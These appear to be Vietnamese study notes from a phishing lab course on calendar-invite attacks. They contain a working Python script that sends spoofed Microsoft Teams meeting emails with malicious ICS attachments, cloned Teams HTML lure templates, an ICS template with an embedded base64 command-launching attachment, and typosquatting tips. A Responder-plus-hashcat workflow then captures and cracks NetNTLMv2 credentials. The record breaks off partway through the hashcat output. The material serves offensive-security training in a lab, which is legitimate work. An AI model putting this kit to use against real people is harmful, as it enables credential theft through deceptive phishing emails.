Phishing là một phương thức phổ biến được sử dụng nhằm chiếm quyền truy cập trái phép vào hệ thống và các thông tin nhạy cảm. Trong khi phishing qua email truyền thống vẫn cho thấy tính hiệu quả, hiện nay các đối tượng lừa đảo đang khai thác lời mời lịch theo những cách mới nhằm vượt qua các cơ chế bảo mật và đánh lừa người dùng. Phương thức này tương ứng với khung MITRE ATT&CK, đặc biệt là kỹ thuật phishing T1566.
## Calendar as an Initial Access Vector
Định dạng iCalendar (ICS) là một tiêu chuẩn được chấp nhận rộng rãi, dùng để chia sẻ thông tin sự kiện giữa nhiều nền tảng lịch khác nhau như Google Calendar, Outlook và Apple Calendar. Cấu trúc tương đối đơn giản của định dạng này, dựa trên các trường chính như thông tin người tổ chức, thời gian sự kiện phần mô tả, khiến ICS trở thành một công cụ vừa đơn giản vừa mạnh mẽ. Tuy nhiên, các tác nhân đe doạ ngày càng khai thác lời mời ICS như một vũ khí, bằng cách gửi các lời mời độc hại tới những người dùng không nghi ngờ nhằm vượt qua các tính năng bảo mật trong một chiến dịch phishing.
Các lời mời độc hại này thường chứa liên kết đến trang phishing hoặc các payload độc hại khác, vốn có thể dễ dàng vượt qua các bộ lọc email và giao thức bảo mật thông thường. Kỹ thuật này đã được ghi nhận trong nhiều chiến dịch phishing thực tế, do đó nó trở thành một vector tấn công quan trọng cần được nghiên cứu.
### The iCalendar (ICS) standard
Tiêu chuẩn iCalendar (ICS) là một định dạng được áp dụng rộng rãi để biểu diễn dữ liệu lịch, hỗ trợ việc trao đổi thông tin về sự kiện, công việc thực hiện và các mục nhật ký một cách nhất quán. Được nhóm Internet Engineering Task Force (IETF) định nghĩa trong RFC 5545, tiêu chuẩn này thúc đẩy khả năng tương tác giữa nhiều hệ thống lịch khác nhau như Google, Calendar, Microsoft Outlook và Apple Calendar.
Về bản chất, một tệp ICS là một tệp văn bản thuần tuý tuân theo một cú pháp cụ thể để biểu diễn các sự kiện lịch. Tệp này bắt đầu bằng phần tiêu đề, trong đó chỉ định phiên bản và phương thức của dữ liệu đang được chia sẻ. Cấu trúc chính của tệp bao gồm các thành phần như `VEVENT` dùng cho sự kiện lịch, `VTODO` dùng cho các mục công việc cần thực hiện, và `VJOURNAL` dùng cho các mục nhật ký.
Mỗi thành phần chứa các thuộc tính được biểu diễn dưới dạng các cặp khoá-giá trị, được tổ chức thành từng phần, trong đó mỗi thuộc tính xuất hiện trên một dòng riêng. Tiêu chuẩn này hỗ trợ nhiều cơ chế mã hoá khác nhau nhằm đáp ứng các kiểu dữ liệu khác nhau, bao gồm văn bản, ngày tháng và thời gian.
Thuộc tính `ORGANIZER` chỉ định cá nhân hoặc thực thể chịu trách nhiệm đối với sự kiện. Trường này thường bao gồm một địa chỉ email và cũng có thể chứa tên hiển thị.
```markdown
ORGANIZER;CN="John Doe":mailto:johndoe@example.com
```
Thời gian diễn ra sự kiện là một yếu tố quan trọng, và các thuộc tính `DTSTART` và `DTEND` lần lượt chỉ định thời điểm bắt đầu và kết thúc của sự kiện. Các trường này có thể bao gồm thông tin múi giờ nhằm tránh nhầm lẫn giữa các khu vực địa lý khác nhau.
```markdown
DTSTART;TZID=America/New_York:20231015T090000
DTEND;TZID=America/New_York:20231015T100000
```
Thuộc tính `DESCRIPTION` cung cấp thông tin bổ sung về sự kiện, chẳng hạn như chương trình họp, địa điểm hoặc các thông tin liên quan khác. Trường này giúp làm rõ bối cảnh và mục đích sự kiện.
```markdown
DESCRIPTION:Weekly team meeting to discuss project updates and milestones.
```

### Creating a Custom Calendar Invite
Bây giờ chúng ta sẽ tạo một email lời mời được cá nhân hoá và gửi nó bằng công cụ `sendEmail` từ máy Kali.
Trước tiên, ta sẽ gửi một email thử nghiệm với mẫu ICS dưới đây:
```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=Peter:mailto:peter@corp1.com
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://meeting.corp1.com
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```
Chúng ta sẽ phân tích lần lượt các trường khác nhau mà ta đã chỉnh sửa trong phần `VEVENT`, đồng thời thảo luận về các chiến thuật mà đối thủ có thể cân nhắc khi thao túng những trường này.
Các trường `DTSTART` và `DTEND` lần lượt xác định thời điểm bắt đầu và kết thúc của sự kiện. Đối thủ thường đặt các giá trị này vào khung giờ làm việc thông thường nhằm tăng mức độ hợp pháp mà người dùng cảm nhận đối với sự kiện.
Trường `ORGANIZER` chứa tên và địa chỉ email tuỳ chỉnh của chúng ta. Mục tiêu là khiến sự kiện trông như thể được gửi từ một nguồn đáng tin cậy. Đối thủ thường chén vào trường `DESCRIPTION` các liên kết độc hại hoặc hướng dẫn nhằm điều hướng nạn nhân đến các trang phishing hoặc các tệp tải xuống chứa mã độc.
Cuối cùng, `UID` là mã định danh duy nhất của sự kiện, bảo đảm rằng sự kiện có thể vượt qua một số cơ chế lọc và xuất hiện như một mục lịch riêng biệt trong lịch trình của mục tiêu, từ đó khiên việc phát hiện trở nên khó khăn hơn. Giá trị này cũng có thể được tạo ngẫu nhiên tại thời điểm chạy.
Trước khi gửi lời mời lịch tuỳ chỉnh ban đầu, chúng ta sẽ thiết kế một mẫu email HTML cơ bản để có thể tuỳ chỉnh ở các bước sau.
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test</title>
</head>
<body>
    <p>Hello,</p>
    <p>This is a test email</p>
    <p>Best regards,Attacker</p>
</body>
</html>
```
Chúng ta sẽ lưu mẫu này với tên là templete.html và lưu tệp ICS với tên `iCalendar.ics` trên máy Kali. 
![[Screenshot 2026-06-20 at 10.30.04.png|center|border|600]]

**Task: Download the attached flag1.ics file and send it over to the client01 target machine as illustrated in this module. What is the proposed date of the meeting? The answer has to be typed in the _DDMMYY_ format.**
![[Screenshot 2026-06-20 at 10.39.11.png|center|border|600]]

## Abusing Calendars
### Crafting the Full Calendar Phishing
Trong phần trước, chúng ta đã tạo một lời mời lịch ICS tuỳ chỉnh và một email đơn giản dựa trên HTML. Để nâng cao mức độ thuyết phục của phishing, ta cần cải thiện nội dung email nhằm khiến nó trông chân thục hơn. Cụ thể, chúng ta sẽ mô phỏng một lời Microsoft Teams hợp lệ bằng cách sao chép định dạng HTML của nó. Dưới đây là mẫu HTML hợp lệ đã được cập nhập một số nội dung:
```html
p class=MsoNormal style='background:white'><span style='color:black'>We are reaching out to inform you of an urgent meeting scheduled by the HR Department that requires your immediate attention.<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif; color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif; color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
```
Lưu ý rằng chúng ta đã sao chép bố cục gốc của Microsoft Teams và thay thế nội dung của mọi liên kết web `herf` bằng một giá trị `[ATTACKER_URL]`. Chúng ta cần thay thế giá trị `[ATTACKER_URL]`, bao gồm cả dẫu ngoặc vuông địa chỉ của máy tấn công Kali.

>**INFO**
>Trong một kịch bản mô phỏng phishing thực tế, chúng ta sẽ xây dựng các email điều hướng người nhận đến tên miền giả mạo do chúng ta kiểm soát, có hình thức gần giống với tên miền gốc của tổ chức mục tiêu. Quá trình này liên quan đến kỹ thuật typosquatting, trong đó kẻ tấn công tạo ra các miền mô phỏng tên miền hợp lệ bằng cách thay đổi, thêm hoặc loại bỏ một số ký tự. Ví dụ, việc sử dụng các ký tự có dạng tương tự, chẳng hạn như "1" thay cho "l" hoặc "0" thay cho "o", hoặc tạo ra các biến thể chính tả nhỏ, có thể làm tăng khả năng người nhận không nhận ra sự khác biệt. Kỹ thuật này cải thiện tỷ lệ thành công của nỗ lực phishing bằng cách lợi dụng xu hướng phổ biến của người dùng là bỏ qua những khác biệt nhỏ trong tên miền.

Sau khi nhập các địa chỉ IP, chúng ta sẵn sàng gửi email phishing dựa trên lịch. Chúng ta sẽ lưu mẫu email mới tạo với tên `email.html` trên máy Kali và gửi phiên bản thứ hai đã được cải thiện của lời mời lịch:
![[Screenshot 2026-06-20 at 16.01.15.png|center|border|600]]
### Automating the Attack
Hiện tại, chúng ta đã có một mẫu cho sự kiện lịch ICS và phần HTML cho nội dung email. Tiếp theo, hãy kết hợp cả hai thành phần này và tự động hoá mẫu phishing bằng một script Python. 
Để tự động hoá hoàn toàn một chiến dịch phishing sử dụng cả sự kiện lịch ICS và nội dung email HTML, chúng ta cần tạo các mẫu linh hoạt ó thể được điền tự động bằng những thông tin cụ thể chẳng hạn như mô tả cuộc họp, URL, thời gian và các thông tin sự kiện khác.
Dưới đây là một mẫu HTML đã được cập nhật, tương tự phiên bản trước, nhưng sử dụng các giá trị giữ chỗ tổng quát hơn:
```html
<p class=MsoNormal style='background:white'><span style='color:black'>{EVENT_TEXT}<u1:p>&nbsp;<o:p></o:p></span></u1:p></p> <p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p> <p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p> <p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p> <p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif;color:#252424'><a href="{EVENT_URL}" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p> <p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif;color:#252424'><a href="https://aka.ms/JoinTeamsMeeting" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="{EVENT_URL}" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p> <p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
```
Tương tự phiên bản trước, mẫu này có hình thức rất giống một lời mời hợp Microsoft Teams hợp lệ, qua đó làm tăng mức độ tin cậy của email. Chúng ta có thể đưa vào một đoạn văn bản có thể tuỳ chỉnh, `{EVENT_TEXT}` nhằm cung cấp ngữ cảnh cho cuộc họp, chẳng hạn như cuộc họp nhân sự hoặc thông báo cập nhập của công ty, khiến email trở nên phù hợp hơn với người nhận.
Thành phần quan trọng của mẫu là liên kết phishing có thể nhấp vào, `{EVENT_URL}`, được gắn nhãn là “Click here to join the meeting”.
Tạm thời, chúng ta sẽ lưu nội dung này dưới tên `email_template.html` trên máy Kali.
Tiếp theo, chúng ta sẽ chuyển sang mẫu ICS, có nội dung như sau:
```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\c3RhcnQgY21kLmV4ZQo=
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```
Trong script Python mà chúng ta sắp tạo, các giá trị giữ chỗ nằm trong dấu ngoặc nhọn trong mẫu ICS sẽ được thay thế động để tạo ra lời mời lịch được cá nhân hóa. Hãy cùng thảo luận một số giá trị giữ chỗ này.
Chúng ta sẽ sử dụng `{DTSTAMP}` cho dấu thời gian tạo sự kiện, qua đó bảo đảm mỗi lời mời có một mã định danh duy nhất. Thời điểm bắt đầu và kết thúc sự kiện sẽ được chèn vào `{DTSTART}` và `{DTEND}`, phản ánh thời gian cuộc họp được lên lịch theo định dạng UTC.
Đối với tên của người tổ chức sự kiện, chúng ta có thể đặt tĩnh `{ORGANIZER_NAME}` thành một giá trị như “HR Team Corp1”, đồng thời điền động `{ORGANIZER_EMAIL}` bằng giá trị `sender_email` được cung cấp, khiến email trông như thể được gửi từ một nguồn đáng tin cậy.
Chúng ta sẽ điền giá trị `{DESCRIPTION}` bằng URL phishing thông qua đối số `event_url`, qua đó nhúng nội dung độc hại vào phần mô tả của lời mời. Tiêu đề hoặc chủ đề của sự kiện sẽ được định nghĩa tĩnh thông qua giá trị giữ chỗ `{SUMMARY}`, ví dụ “HR Meeting”. Cuối cùng, giá trị `{ATTENDEES}` sẽ được điền bằng đầu ra của hàm `generate_attendees()`, trong đó liệt kê các cá nhân quan trọng như những người tham dự cuộc họp nhằm tăng tính hợp pháp của lời mời.
Chúng ta sẽ lưu nội dung này dưới tên `iCalendar_template.ics` trên máy Kali và đã sẵn sàng viết script Python thực tế.

>**INFO**
>Phần lớn mã nguồn được lấy cảm hứng từ FakeMeeting, nhưng chúng ta đã cải tiến để công cụ trở nên linh hoạt và có khả năng mở rộng tốt hơn.

Chúng ta sẽ bắt đầu bằng cách nhập các thư viện cần thiết để xử lý thời gian, tạo email và quản lý các đối số hệ thống. Sau đó, chúng ta sẽ định nghĩa các thiết lập chính như tiêu đề email, tóm tắt sự kiện, tên người tổ chức và danh sách người tham dự cho cuộc họp giả định

```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate

# email settings
EMAIL_SUBJECT = "HR Meeting"

# event settings
EVENT_SUMMARY = "HR meeting"

ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]
```

Tiếp theo, chúng ta sẽ bổ sung các hàm `load_template` và `load_ics` để đọc lần lượt các mẫu HTML và ICS tương ứng. Điều này cho phép chúng ta sử dụng các giá trị giữ chỗ đã được định nghĩa trước cho phần thân email và lời mời lịch.

```python
def prepare_template(event_url):
    email_template = load_template()
    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)
    return email_template

def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    ics_template = load_ics()
    ics_template = ics_template.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )
    return ics_template
```

Trong hàm `prepare_template`, chúng ta định dạng phần thân email HTML bằng cách thay thế các giá trị giữ chỗ bằng nội dung cụ thể, bao gồm cả URL của sự kiện. Một thao tác tương tự cũng được thực hiện trong hàm `prepare_ics`, trong đó các dấu thời gian, thông tin người tổ chức và URL sự kiện được chèn động vào tệp ICS, với URL sự kiện được sử dụng làm phần mô tả.

Chúng ta sẽ bổ sung hàm `generate_attendees` để xây dựng danh sách người tham dự được định dạng sao cho trông giống các thành viên hợp lệ của cuộc họp. Điều này góp phần tăng thêm mức độ tin cậy cho nỗ lực phishing.

Biến toàn cục `ATTENDEES` trong đoạn mã được cung cấp là một mảng chứa các địa chỉ email của những người tham dự.
```python
ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]

def generate_attendees():
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee)
        )
    return "\r\n".join(attendees)
```

Tiếp theo, chúng ta sẽ tạo hàm `send_email` để gửi email. Chúng ta sẽ tính toán thời gian hiện tại theo chuẩn UTC, chuẩn bị tệp ICS và phần thân email bằng các hàm đã được định nghĩa trước đó, đồng thời xây dựng thông điệp email với các header và tệp đính kèm phù hợp. Sau đó, chúng ta sẽ kết nối tới máy chủ SMTP và gửi email đã được tạo.

Cuối cùng, hàm `main` của chúng ta yêu cầu các đối số bao gồm máy chủ SMTP, địa chỉ email người gửi, địa chỉ email người nhận và URL của sự kiện. Hàm này sẽ gọi `send_email()`, qua đó thực thi cuộc tấn công phishing bằng cách gửi email đã được xây dựng.

Dưới đây là toàn bộ script `fakeics.py`:
```python
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate


# email settings
EMAIL_SUBJECT = "HR Meeting"

# event settings
EVENT_SUMMARY = "HR meeting"

ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]

# template settings
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent company-wide changes and policies. Your attendance is highly encouraged as we will be discussing essential updates that impact all employees.

Topics will include:

- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""

def load_template():
    template = ""
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        template = f.read()
    return template


def prepare_template(event_url):
    email_template = load_template()
    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)
    return email_template


def load_ics():
    ics = ""
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        ics = f.read()
    return ics


def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    ics_template = load_ics()
    ics_template = ics_template.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,  # Use event_url as DESCRIPTION
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )
    return ics_template


def generate_attendees():
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee)
        )
    return "\r\n".join(attendees)


def send_email(smtp_server, sender_email, to, event_url):
    print('Sending email to: ' + to)

    # in .ics file timezone is set to be utc
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now()
    dtoff = datetime.timedelta(minutes=utc_offset + 5)  # meeting has started 5 minutes ago
    duration = datetime.timedelta(hours=1)  # meeting duration
    ddtstart = ddtstart - dtoff
    dtend = ddtstart + duration
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = sender_email
    msg['To'] = to

    part_email = MIMEText(email_body, "html")
    part_cal = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % ("invite.ics"))
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % ("invite.ics"))

    eml_atch = MIMEBase('text/plain', '')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()


def main():
    if len(sys.argv) != 5:
        print("Usage: python fakemeeting.py <smtp_server> <sender_email> <recipient_email> <event_url>")
        sys.exit(1)

    smtp_server = sys.argv[1]
    sender_email = sys.argv[2]
    recipient_email = sys.argv[3]
    event_url = sys.argv[4]

    send_email(smtp_server, sender_email, recipient_email, event_url)


if __name__ == "__main__":
    main()
```

Bây giờ, chúng ta đã sẵn sàng kiểm thử script từ máy Kali và tự động hóa hoàn toàn cuộc tấn công phishing thông qua lịch. Chúng ta sẽ cung cấp bốn đối số: địa chỉ IP của máy chủ SMTP (`192.168.50.121`), địa chỉ email của người gửi (`hr@corp1.com`), địa chỉ email của người nhận (`offsec@corp1.com`) và một URL (`http://192.168.45.205)

```bash
python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151 
```

![[Screenshot 2026-06-20 at 16.54.59.png|center|border|700]]

### Credential Stealing with Responder
Trong các phần trước chúng ta đã xây dựng một email phishing có tính thuyết phục, mô phỏng thông báo của Microsoft Teams. Thông điệp này có thể khiến một người dùng thiếu cảnh giác nhấp vào URL độc hại, để tối đa hoá hiệu quả của cuộc tấn công phishing, chúng ta sẽ vũ khí hoá URL đó và cố gắng đánh cắp thông tin xác thực của nạn nhân thông qua một nỗ lực phishing tầng thứ hai.
Chúng ta sẽ thực hiện điều này bằng Responder, một công cụ mã nguồn mở chủ yếu được sử dụng cho trinh sát mạng và thu thập thông tin xác thực trong các môi trường mà những giao thức Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NT) và Multicast DNS (mDNS) được cấu hình không đúng cách. Công cụ này khai thác các điểm yếu mạng nói trên để chặn bắt các yêu cầu xác thực và thu thập thông tin nhạy cảm, chẳng hạn như thông tin xác thực của người dùng.
Chúng ta cũng có thể sử dụng Responder cho các cuộc tấn công theo phong cách phishing nhằm thu thập thông tin xác thực như qua HTTP, bằng cách khai thác các dịch vụ mạng như SMB và HTTP vốn phụ thuộc vào cơ chế phân giải tên trong mạng. Ví dụ, khi một người dùng trong mạng dễ bị tổn thương cố gắng truy cập một tài nguyên không tồn tại, Responder có thể chặn bắt yêu cầu đó và đánh lừa người dùng gửi thông tin xác thực của họ bằng cách phản hồi thông qua một máy chủ HTTP hoặc SMB độc hại.
Đối với cuộc tấn công này, chúng ta sẽ thực hiện theo kế hoạch sau: sau khi gửi email phishing, nạn nhân có khả năng sẽ nhấp vào liên kết “meeting” độc hại, vì tin rằng đó là một lời mời Microsoft Teams hợp lệ. Sau khi liên kết được nhấp, Responder sẽ chặn bắt yêu cầu và hiển thị một hộp thoại đăng nhập giả mạo, mô phỏng giao diện đăng nhập Microsoft Teams quen thuộc. Người dùng sau đó sẽ được yêu cầu nhập thông tin xác thực để tiếp tục.
Khi nạn nhân nhập thông tin xác thực, Responder sẽ ngay lập tức thu thập và ghi lại chúng. Các thông tin xác thực này thường được gửi dưới dạng băm, nhưng chúng ta có thể cố gắng bẻ khóa chúng bằng các công cụ như Hashcat để thu được mật khẩu dạng rõ.
Hãy xem cơ chế này hoạt động như thế nào trong thực tế. Trước tiên, chúng ta sẽ khởi động Responder, vốn đã được cài đặt sẵn trên máy Kali Linux. Công cụ này sẽ phản hồi bất kỳ yêu cầu HTTP nào được gửi đến địa chỉ IP của máy Kali. Chúng ta sẽ chạy công cụ với một đối số duy nhất, dùng để chỉ định giao diện đường hầm VPN.
![[Screenshot 2026-06-20 at 17.12.41.png|center|border|650]]

Sau khi listener của Responder đã được thiết lập, chúng ta có thể gửi nỗ lực phishing email cuối cùng bằng cách chạy script Python.

![[Screenshot 2026-06-20 at 17.15.39.png|center|border|650]]

Trong vai trò của nạn nhân, chúng ta sẽ mở Thunderbird trên máy `client01`, mở email và nhấp vào liên kết “Click here to join the meeting”. Hành động này sẽ hiển thị thông báo Windows Security giả mạo như sau:
![[Screenshot 2026-06-20 at 17.16.39.png|center|border|650]]
Chúng ta sẽ lưu toàn bộ chuỗi hash thu được vào tệp `hash.txt` trên máy Kali.
![[Screenshot 2026-06-20 at 17.21.40.png|center|border|650]]
Tiếp theo, chúng ta sẽ thử bẻ khóa chuỗi hash bằng Hashcat. Chúng ta sẽ sử dụng tùy chọn `-m 5600` để chỉ định rằng hash thuộc loại NetNTLMv2, cung cấp tệp `hash.txt` làm đầu vào, đồng thời sử dụng wordlist phổ biến `rockyou.txt` nằm tại đường dẫn `/usr/share/wordlists/rockyou.txt`. Quá trình này sẽ băm các từ trong wordlist và so sánh chúng với hash của người dùng. Nếu có sự trùng khớp, chúng ta đã tìm được mật khẩu dạng rõ của người dùng `offsec`.
```bash
┌──(duong㉿duong)-[~/offsec]
└─$ hashcat -m 5600  hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu--0x000, 2939/5878 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (6058 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

